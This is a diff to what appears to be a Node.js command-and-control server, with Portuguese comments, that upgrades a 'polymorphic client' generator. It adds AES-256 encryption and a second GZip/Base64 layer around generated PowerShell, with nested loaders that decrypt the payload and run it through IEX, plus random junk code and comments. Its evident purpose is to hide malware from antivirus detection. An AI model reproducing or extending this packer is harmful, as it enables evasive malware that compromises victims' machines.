@@ -8,6 +8,7 @@ import { dirname } from 'path';
 import jwt from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
 import zlib from 'zlib';
+import crypto from 'crypto';
 
 // Gerador de código polimórfico
 function generatePolymorphicClient() {
@@ -90,23 +91,61 @@ function generatePolymorphicClient() {
 
   code = `${randComment()}\n${junkCode}${randComment()}\n${code}`;
 
-  // Comprimir com GZip e converter para Base64
+  // CAMADA 1: Comprimir com GZip
   const compressed = zlib.gzipSync(Buffer.from(code, 'utf-8'));
-  const b64 = compressed.toString('base64');
 
-  // Gerar loader polimórfico
-  const lv = { d: randStr(), m: randStr(), g: randStr(), r: randStr() };
+  // CAMADA 2: Criptografar com AES-256-CBC
+  const aesKey = crypto.randomBytes(32);
+  const aesIV = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, aesIV);
+  const encrypted = Buffer.concat([cipher.update(compressed), cipher.final()]);
 
-  const loader = `${randComment()}
-$${lv.d}=[Convert]::FromBase64String('${b64}')
-$${lv.m}=New-Object IO.MemoryStream(,$${lv.d})
-$${lv.g}=New-Object IO.Compression.GZipStream($${lv.m},[IO.Compression.CompressionMode]::Decompress)
-$${lv.r}=New-Object IO.StreamReader($${lv.g})
+  // Converter para Base64
+  const encB64 = encrypted.toString('base64');
+  const keyB64 = aesKey.toString('base64');
+  const ivB64 = aesIV.toString('base64');
+
+  // Variáveis do loader interno (descriptografa e executa)
+  const lv1 = { k: randStr(), i: randStr(), e: randStr(), a: randStr(), d: randStr(), m: randStr(), g: randStr(), r: randStr(), c: randStr() };
+
+  const innerLoader = `${randComment()}
 ${junk()}
-IEX $${lv.r}.ReadToEnd()
+$${lv1.k}=[Convert]::FromBase64String('${keyB64}')
+$${lv1.i}=[Convert]::FromBase64String('${ivB64}')
+$${lv1.e}=[Convert]::FromBase64String('${encB64}')
+$${lv1.a}=[Security.Cryptography.Aes]::Create()
+$${lv1.a}.Key=$${lv1.k}
+$${lv1.a}.IV=$${lv1.i}
+$${lv1.a}.Mode=[Security.Cryptography.CipherMode]::CBC
+$${lv1.a}.Padding=[Security.Cryptography.PaddingMode]::PKCS7
+$${lv1.d}=$${lv1.a}.CreateDecryptor()
+$${lv1.c}=$${lv1.d}.TransformFinalBlock($${lv1.e},0,$${lv1.e}.Length)
+${junk()}
+$${lv1.m}=New-Object IO.MemoryStream(,$${lv1.c})
+$${lv1.g}=New-Object IO.Compression.GZipStream($${lv1.m},[IO.Compression.CompressionMode]::Decompress)
+$${lv1.r}=New-Object IO.StreamReader($${lv1.g})
+${junk()}
+IEX $${lv1.r}.ReadToEnd()
 ${randComment()}`;
 
-  return loader;
+  // CAMADA 3: Comprimir e Base64 o loader interno
+  const layer2Compressed = zlib.gzipSync(Buffer.from(innerLoader, 'utf-8'));
+  const layer2B64 = layer2Compressed.toString('base64');
+
+  // Variáveis do loader externo
+  const lv2 = { d: randStr(), m: randStr(), g: randStr(), r: randStr() };
+
+  const outerLoader = `${randComment()}
+${junk()}
+$${lv2.d}=[Convert]::FromBase64String('${layer2B64}')
+$${lv2.m}=New-Object IO.MemoryStream(,$${lv2.d})
+$${lv2.g}=New-Object IO.Compression.GZipStream($${lv2.m},[IO.Compression.CompressionMode]::Decompress)
+$${lv2.r}=New-Object IO.StreamReader($${lv2.g})
+${junk()}
+IEX $${lv2.r}.ReadToEnd()
+${randComment()}`;
+
+  return outerLoader;
 }
 
 // Get country from IP
